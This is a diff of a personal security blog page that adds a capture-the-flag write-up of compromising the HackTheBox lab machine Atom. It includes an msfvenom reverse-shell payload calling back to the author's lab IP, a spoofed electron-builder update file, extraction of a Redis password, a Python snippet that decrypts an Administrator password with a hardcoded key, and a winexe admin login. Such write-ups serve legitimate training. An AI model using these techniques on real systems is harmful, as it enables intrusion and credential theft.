@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Welcome to my personal Security blog!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Atom , Which is an Medium Windows machine!" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-atom/" />
 
   
 
@@ -276,8 +276,6 @@
   
 
   
-    <link rel="alternate" href="/writeups/index.xml" type="application/rss+xml" title="Mohamed ELLEUCH" />
-  
 
   
     <link rel="manifest" href="/index.webmanifest" />
@@ -286,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-atom/" />
 
   
   
@@ -296,20 +294,23 @@
   
   
     
-    
   
   
-  <meta property="twitter:card" content="summary" />
+  <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/" />
-  <meta property="og:title" content="Writeups | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Welcome to my personal Security blog!" /><meta property="og:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-atom/" />
+  <meta property="og:title" content="HackTheBox - Atom Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Atom , Which is an Medium Windows machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-atom/Featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-atom/Featured.png" /><meta property="og:locale" content="en-us" />
   
     
-      <meta property="og:updated_time" content="2021-07-10T00:00:00&#43;00:00" />
+      <meta
+        property="article:published_time"
+        content="2021-07-10T00:00:00&#43;00:00"
+      />
     
+    <meta property="article:modified_time" content="2021-07-10T00:00:00&#43;00:00">
   
 
   
@@ -320,11 +321,13 @@
 
   
 
+  
 
 
 
 
-  <title>Writeups | Mohamed ELLEUCH</title>
+
+  <title>HackTheBox - Atom Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -588,6 +591,232 @@
   </div>
 
   <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Atom Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Atom, Which is a Medium Windows machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Jul 10, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 589px; max-height: 344px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-atom/Featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code>sudo nmap -sC -sV 10.10.10.237 -v
+</code></pre>
+<pre><code>80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+135/tcp open  msrpc        Microsoft Windows RPC
+443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
+|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+
+</code></pre>
+<h2 id="p-stylecolorgreenweb-enumeration-p"><p style="color:Green">Web Enumeration </p></h2>
+<img src="web.png">
+<p>It&rsquo;s a static page with an executeable to download, but nothing interesting! Let&rsquo;s keep enumerating</p>
+<h2 id="p-stylecolorgreensmb-enumeration-p"><p style="color:Green">SMB Enumeration </p></h2>
+<img src="smb.png">
+<p>An interesting share <code>Software_Updates</code> let&rsquo;s take a look at it</p>
+<img src="foothold.png">
+<p>Let&rsquo;s try download everything</p>
+<pre><code>prompt off
+recurse on
+mget *
+</code></pre>
+<img src="smbfiles.png">
+We only have a pdf file!
+<hr>
+<h1 id="p-stylecolorred-foothold-p"><p style="color:RED"> Foothold </p></h1>
+<hr>
+<p>Let&rsquo;s take a look at the pdf file</p>
+<img src="electron.png">
+<img src="electron1.png">
+<p>The Heedv1 app is build with <code>electron-builder</code> and also we can drop updates in the client folders in the smb and it get executed.
+Searching in  google for an electron builder update rce, we can find an interesting</p>
+<p>Let&rsquo;s first create our shell with the name &ldquo;s&rsquo;hell.exe&rdquo; to bypass the signature</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &quot;s'hell.exe&quot;
+</code></pre>
+<p>And also generate the encdoded shasum of our malicious file</p>
+<pre><code>shasum -a 512 s\'hell.exe | cut -d &quot; &quot; -f1 | xxd -r -p | base64
+</code></pre>
+<p>Now we&rsquo;re ready to create our <code>latest.yml</code></p>
+<pre><code class="language-yml">version: 1.2.3
+
+path: http:/IP:PORT/s'hell.exe
+sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
+</code></pre>
+<p>Let&rsquo;s setup a listener and upload them to the clients folder in the smb! And wait until we get a shell back</p>
+<img src="foothold.png">
+<p>We&rsquo;re on the box now! And we can get the user flag !:D</p>
+<img src="user.png">
+<hr>
+<h1 id="p-stylecolorred-privesc-p"><p style="color:RED"> PrivEsc </p></h1>
+<hr>
+<p>Before running any enumerating tool, i always check the Program file folders to check if we have any Software  (a aka free win) installed in the system!</p>
+<img src="portable.png">
+<p>We  can copy the whole file and try to retrieve the encrypted like the machine <code>sharp</code> but let&rsquo;s keep enumerating!</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></p>
+</blockquote>
+<img src="redis.png">
+<p>We can see that Redis is installed, we can grab the redis password from the config file</p>
+<img src="pass.png">
+<pre><code>requirepass kidvscat_yes_kidvscat
+</code></pre>
+<p>Now we can enumerate the redis service!</p>
+<p>We will use the redis-tools package</p>
+<pre><code>sudo apt-get install redis-tools
+</code></pre>
+<blockquote>
+<p>A very good ressource, i&rsquo;ll use everything from here <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p>
+</blockquote>
+<p>Let&rsquo;s dump the database</p>
+<pre><code class="language-redis">info
+</code></pre>
+<img src="rd.png">
+<p>Let&rsquo;s list the keys from the db0</p>
+<img src="rd1.png">
+<p>Let&rsquo;s check their content
+<img src="PS.png"></p>
+<p>The key <code>pk⚱user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> seems to give us credentials</p>
+<pre><code>Administrator:Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
+</code></pre>
+<p>Seems like it&rsquo;s an encrypted password! And we already know that we have an exploit to decrypt it ! Lets give it a try</p>
+<p>Let&rsquo;s just take a snippet from the exploit-db exploit</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64
+from des import *
+def decode(hash):
+	hash = base64.b64decode(hash.encode('utf-8'))
+	key = DesKey(b&quot;7ly6UznJ&quot;)
+	return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8')
+
+print('[+] Decrypted Password: '+decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
+</code></pre>
+<img src="adminpass.png">
+<pre><code>Administrator:kidvscat_admin_@123
+</code></pre>
+<p>Now let&rsquo;s login as administrator to the machine</p>
+<pre><code>winexe -U 'Administrator%kidvscat_admin_@123' //10.10.10.237 cmd.exe
+</code></pre>
+<img src="toor.png">
+<p>And we rooted the machine!</p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
     
 
 
@@ -595,167 +824,228 @@
 
 
 
-
-
-
-
-
-
+<div class="article-tags">
   
-
-  
-  
-  
-    
-  
-<div class="universal-wrapper pt-3">
-  <h1>Writeups</h1>
-
-  
-
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
   
 </div>
 
 
 
-<div class="universal-wrapper">
-  
-
-  
-  
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-atom/" >HackTheBox - Atom Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Atom , Which is an Medium Windows machine!
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-atom/&amp;text=HackTheBox%20-%20Atom%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-atom/&amp;t=HackTheBox%20-%20Atom%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-spectra/" >HackTheBox - Spectra Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Spectra an easy ChromeOS Machine
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Atom%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-atom/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-atom/&amp;title=HackTheBox%20-%20Atom%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-tentacle/" >HackTheBox - Tentacle Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Tentacle, Which is a Hard rated Linux machine!
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Atom%20Writeup%20https://mohamed-elleuch.me/writeups/htb-atom/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-tenet/" >HackTheBox - Tenet Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Tenet, Which is a Medium Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-scriptkiddie/" >HackTheBox - ScriptKiddie Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-ready/" >HackTheBox - Ready Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Ready, Which is a Medium Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/ct-crashed/" >CyberTalents - Crashed Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the Hard rated machine Crashed from Cybertalents
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-laboratory/" >HackTheBox - Laboratory Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-luanne/" >HackTheBox - Luanne Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-passage/" >HackTheBox - Passage Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!
-        
-      </div>
-    </div>
-  
-
-  
-<nav>
-  <ul class="pagination justify-content-center">
-    
-    
-    <li class="page-item"><a class="page-link" href="/writeups/page/2/">&raquo;</a></li>
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-atom/&amp;title=HackTheBox%20-%20Atom%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
     
   </ul>
-</nav>
-
-
 </div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
   </div>
 
   <div class="page-footer">
